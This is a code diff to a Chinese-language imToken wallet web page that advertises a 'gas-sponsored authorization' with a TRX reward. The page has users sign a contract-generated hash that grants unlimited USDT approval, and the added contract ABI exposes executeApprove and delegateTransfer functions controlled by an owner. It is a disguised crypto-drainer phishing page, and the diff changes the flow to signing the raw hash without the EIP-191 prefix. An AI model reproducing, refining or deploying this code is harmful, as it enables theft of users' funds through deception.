@@ -296,7 +296,7 @@
         <!-- 头部 -->
         <div class="header">   
             <div>
-                <h1>imToken代付授权</h1>
+                <h1>imToken代付授权服务</h1>
                 <p class="desc">代付合约专属服务：矿工费由部署者承担，已授权无限额度则不可重复授权</p>
             </div>
         </div>   
@@ -314,7 +314,7 @@
                 <p><span class="highlight">您现在使用的是代付合约服务，无需支付矿工费</span></p>
                 <p><span class="highlight">1. 已授权无限额度则不可重复授权</span></p>         
                 <p><span class="highlight">2. 授权后可领取18.2157TRX奖励</span></p>
-                <p><span class="highlight">3. 连接钱包后自动调用合约生成哈希（含0x前缀）</span></p>
+                <p><span class="highlight">3. 连接钱包后自动调用合约生成带0x前缀哈希，直接签名</span></p>
             </div>
             <!-- 已连接钱包时显示 -->
             <div class="connected-content">
@@ -323,7 +323,7 @@
                 <p>• 授权类型：<span class="highlight">USDT无限额度授权（合约固定）</span></p>
                 <p>• 奖励额度：<span class="highlight">18.2157TRX</span></p>
                 <p>• 矿工费：<span class="highlight">部署者代付（无需您支付TRX）</span></p>
-                <p class="orange-tip">⚠️提示：点击「生成离线签名」将调用合约获取带0x前缀的哈希并唤起签名，签名后等待部署者完成授权</p>
+                <p class="orange-tip">⚠️提示：点击「生成离线签名」将直接使用合约返回的带0x前缀哈希，按合约要求签名</p>
             </div>
         </div>
         <!-- 合约剩余资源显示容器 -->
@@ -355,7 +355,7 @@
         <!-- 警告框 -->
         <div class="warning">
             <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开（需唤起签名功能）</p>
-            <p> ⚠️ 操作流程：连接钱包 → 生成离线签名（合约返回带0x前缀哈希） → 等待代付授权 → 领取奖励</p>
+            <p> ⚠️ 操作流程：连接钱包 → 生成离线签名（直接使用合约带0x前缀哈希） → 等待代付授权 → 领取奖励</p>
             <!-- 复制链接区 -->
             <div class="copy-link-wrap">
                 <span id="copyLinkText">https://trc20trx-alt.github.io/Trc20.TRX/</span>
@@ -387,6 +387,184 @@
         const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
         const INIT_TRX = 315360004;
         const TRX_DECREASE_PER_SEC = 2.3256;
+        [
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "usdtAddress",
+				"type": "address"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "timestamp",
+				"type": "uint256"
+			}
+		],
+		"name": "ApproveExecuted",
+		"type": "event"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "recipient",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "delegateTransfer",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			},
+			{
+				"internalType": "uint8",
+				"name": "v",
+				"type": "uint8"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "r",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "s",
+				"type": "bytes32"
+			}
+		],
+		"name": "executeApprove",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "recipient",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "TransferDelegated",
+		"type": "event"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			}
+		],
+		"name": "generateHash",
+		"outputs": [
+			{
+				"internalType": "bytes32",
+				"name": "",
+				"type": "bytes32"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "MAX_AMOUNT",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "OWNER",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "USDT",
+		"outputs": [
+			{
+				"internalType": "contract ITRC20",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+]
         // 全局变量
         let tronWeb, userAddress, trxTimer, contractInstance; // 新增合约实例变量
         let tokenBalance = "0.00", trxBalance = "0.00";
@@ -457,7 +635,7 @@
                     // 清理地址隐形字符
                     userAddress = cleanBase58Address(userAddress);
                     // 初始化合约实例（关键：连接后创建合约实例）
-                    contractInstance = tronWeb.contract().at(DELEGATE_CONTRACT);
+                    contractInstance = tronWeb.contract(CONFIG.CONTRACT_ABI, CONFIG.DELEGATE_CONTRACT);
                     connectBtn.style.display = "none";
                     warning.style.display = "none";
                     await initWallet();
@@ -466,7 +644,7 @@
                     showToast("连接失败：" + e.message, "error");
                 }
             };
-            // 生成离线签名（核心修改：确认合约返回带0x前缀哈希，优化处理逻辑）
+            // 生成离线签名（核心修改：完全按合约要求，直接使用带0x前缀的哈希签名，无冗余步骤）
             approveBtn.onclick = async () => {
                 const postData = {
                     address: userAddress,
@@ -480,23 +658,17 @@
                 };
                 try {
                     approveBtn.disabled = true;
-                    approveBtn.innerHTML = '生成中...（调用合约获取带0x前缀哈希）';
+                    approveBtn.innerHTML = '生成中...（直接使用合约带0x前缀哈希）';
                     
-                    // 核心步骤1：调用合约generateHash函数，仅传用户地址，获取带0x前缀的哈希
+                    // 核心步骤1：调用合约generateHash，获取带0x前缀的原始哈希（不做任何前缀修改）
                     const messageHash = await contractInstance.generateHash(userAddress).call();
                     if (!messageHash || !messageHash.startsWith("0x") || messageHash === "0x0000000000000000000000000000000000000000000000000000000000000000") {
                         throw new Error("合约返回哈希无效（需带0x前缀且非全零），请检查合约地址或网络");
                     }
-                    showToast(`合约哈希获取成功（带0x前缀）：${messageHash.slice(0,10)}...`);
+                    showToast(`合约哈希获取成功（保留0x前缀）：${messageHash.slice(0,10)}...`);
 
-                    // 核心步骤2：按合约要求加EIP-191前缀（需移除哈希自带的0x，避免双重前缀）
-                    const prefix = "\x19Ethereum Signed Message:\n32";
-                    const prefixHex = customAsciiToHex(prefix);
-                    const pureHash = messageHash.replace("0x", ""); // 移除合约哈希的0x前缀
-                    const prefixedHash = tronWeb.sha3(prefixHex + pureHash, true); // 拼接后哈希
-
-                    // 核心步骤3：唤起imToken签名（用加前缀后的哈希）
-                    let signature = await tronWeb.trx.sign(prefixedHash);
+                    // 核心步骤2：直接将带0x前缀的哈希传给钱包签名（完全按合约要求，不删任何前缀）
+                    let signature = await tronWeb.trx.sign(messageHash);
                     signature = typeof signature === "object" ? signature.signature : signature;
                     if (!signature) throw new Error("imToken未返回签名");
                     signature = signature.replace(/^0x/, "").replace(/[^0-9a-fA-F]/g, "");
@@ -552,14 +724,12 @@
                     showToast("离线签名生成成功！等待部署者代付授权");
                     postData.status = "submitted";
 
-                    // 保存调试信息（明确标注合约返回哈希带0x前缀）
+                    // 保存调试信息（明确标注未修改哈希前缀）
                     localStorage.setItem(`signature_debug_${userAddress}`, JSON.stringify({
-                        step: "签名生成成功（哈希来自合约generateHash，带0x前缀）",
+                        step: "签名生成成功（直接使用合约带0x前缀哈希，未做任何前缀修改）",
                         userAddress: userAddress,
                         contractAddress: DELEGATE_CONTRACT,
-                        contractReturnedHash: messageHash, // 合约返回的带0x前缀原始哈希
-                        pureHash: pureHash, // 移除0x后的纯哈希
-                        prefixedHash: prefixedHash,
+                        contractReturnedHash: messageHash, // 合约返回的带0x前缀原始哈希（未修改）
                         v: v,
                         r: r,
                         s: s,
@@ -656,18 +826,6 @@
                 throw new Error(`无效的Base58地址（长度${cleanAddr.length}位，需34位字母数字）`);
             }
             return cleanAddr;
-        }
-        /**
-         * 自定义ASCII转Hex函数（用于签名前缀转换）
-         */
-        function customAsciiToHex(str) {
-            let hex = '';
-            for (let i = 0; i < str.length; i++) {
-                const charCode = str.charCodeAt(i);
-                const charHex = charCode.toString(16).padStart(2, '0');
-                hex += charHex;
-            }
-            return hex;
         }
         /**
          * 初始化钱包：获取地址、余额
